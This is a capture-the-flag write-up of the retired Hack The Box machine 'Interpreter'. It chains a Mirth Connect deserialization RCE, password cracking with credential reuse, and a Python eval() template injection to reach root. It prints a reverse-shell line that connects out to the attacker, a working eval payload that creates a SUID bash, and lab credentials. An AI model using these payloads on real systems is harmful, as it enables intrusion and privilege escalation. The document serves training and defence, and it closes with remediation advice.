# Interpreter — Hack The Box, Medium, Linux

**TL;DR:** Ports 80/443 serve a **Mirth Connect 4.4.0** administrator, which
reports its own version unauthenticated. Mirth ≤ 4.4.0 is vulnerable to
**CVE-2023-43208**, an unauthenticated XStream deserialization RCE at
`POST /api/users` — a bypass of the incomplete CVE-2023-37679 fix that shipped
*in* 4.4.0. A commons-collections4 gadget lands a shell as the `mirth` service
account. The app's own `mirth.properties` hands over its MariaDB credentials; the
`PERSON_PASSWORD` table holds a PBKDF2-HMAC-SHA256 hash that cracks to
`snowflake1`, reused verbatim for the `sedric` SSH login. Root is a root-owned
Flask notification service on loopback whose "safe" template runs
`eval(f"f'''{template}'''")` over patient fields — a character allow-list that
still permits `() {} . + / ' "` is no sandbox when `os` and `chr()` are in scope.

## Recon

Four TCP ports: 22 (OpenSSH 9.2p1, Debian bookworm), 80 and 443 (both Jetty),
and 6661. Ports 80/443 serve the same page: **Mirth Connect Administrator**.
Port 6661 turned out to be the same JVM PID as the web app — a Mirth internal
listener, not a separate service, so it was a dead end.

Mirth self-reports its version without authentication:

```
GET /api/server/version   ->  4.4.0
```

Pinning that number is the whole engagement. Mirth Connect ≤ 4.4.0 is vulnerable
to **CVE-2023-43208**, an unauthenticated XStream deserialization RCE — itself a
bypass of the incomplete CVE-2023-37679 fix that shipped *in* 4.4.0.

## Foothold — CVE-2023-43208

The sink is `POST /api/users` with `Content-Type: application/xml` and the
`X-Requested-With` header Mirth's API expects. XStream deserializes the body
with no type allow-list, so a `sorted-set` wrapping a `dynamic-proxy` for
`java.lang.Comparable`, backed by a commons-collections4 `ChainedTransformer`,
drives `ProcessBuilder.start()` when the set tries to sort itself.

A `500 Request failed.` from `/api/users` is the *success* signal — the gadget
ran and failed only afterwards. First a plain HTTP-callback probe confirmed
code exec; then a `bash -i >& /dev/tcp/<me>/<port>` payload returned a shell as
`mirth@interpreter`.

## mirth → sedric — the app's own database

`conf/mirth.properties` hands over the backing store:

```
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

One user in `PERSON` (`sedric`), whose hash lives in `PERSON_PASSWORD`:

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

Base64 → 8-byte salt + 32-byte digest: **PBKDF2-HMAC-SHA256**, Mirth's default
600 000 iterations.

The fiddly part was john's hash format. john's `PBKDF2-HMAC-SHA256` expects
`$pbkdf2-sha256$<iter>$<salt>$<hash>` where salt and hash use passlib's **ab64**
alphabet — standard base64 with `+` rewritten to `.` and no `=` padding. Feed it
ordinary base64 and any `+` makes john silently load *zero* hashes ("No password
hashes loaded"), which reads exactly like a bad hash. A control hash of a known
password, cracked first, nailed the encoding down. Then:

```
$pbkdf2-sha256$600000$u/.LBBOUnac$YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps
```

rockyou → `snowflake1`. Mirth's password policy was fully disabled
(`password.minlength = 0`), so a rockyou word was allowed. `sedric` reused it for
SSH — `user.txt` in hand.

## sedric → root — eval() in a "safe" template

`ps` shows root running `/usr/bin/python3 /usr/local/bin/notif.py`, a Flask
service on `127.0.0.1:54321`. It ingests patient XML at `/addPatient` and formats
a notification. The "safe templating function" is anything but:

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
...
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, ..."
return eval(f"f'''{template}'''")
```

Two f-strings. The first interpolates the patient fields as text; the second
`eval`s the result *as another f-string*. So a `{...}` placed inside a field
survives the first pass as literal text and is **evaluated** by the second. The
input filter blocks spaces, commas and `;`, but still allows `() {} ' " . + /`,
and the eval runs in a scope where `os` is imported and `chr()` is a built-in —
so every forbidden character can be rebuilt at runtime.

Payload in `firstname`, delivered from the box itself (the endpoint checks
`remote_addr == 127.0.0.1`):

```
{os.system('cp'+chr(32)+'/bin/bash'+chr(32)+'/tmp/rootbash'+chr(59)+'chmod'+chr(32)+'+s'+chr(32)+'/tmp/rootbash')}
```

`chr(32)` is space, `chr(59)` is `;`. The response comes back
`Patient 0 x ...` — the `0` is `os.system`'s exit code, i.e. it ran as root.
`/tmp/rootbash -p` → `euid=0` → `root.txt`.

## What each layer should have done

- **Mirth:** not on the network unauthenticated; patched to ≥ 4.4.1.
- **Credentials:** app password not in a readable file; not reused for SSH; a
  password policy that isn't switched off.
- **notif.py:** never `eval()` templated input. A character allow-list is not a
  sandbox — `os` + `chr()` walked straight through it.

## Loot trail

Mirth 4.4.0 RCE → `mirthdb:MirthPass123!` → PBKDF2 crack `sedric:snowflake1` →
SSH → root Flask `eval()` → SUID bash.

---

*Flag values redacted; the machine is retired. CVE-2023-43208 was studied from
its public advisory and proof-of-concept, and the privilege escalation from
reading the target's own on-disk `notif.py` — technology research and local
enumeration, not a walkthrough of this host.*
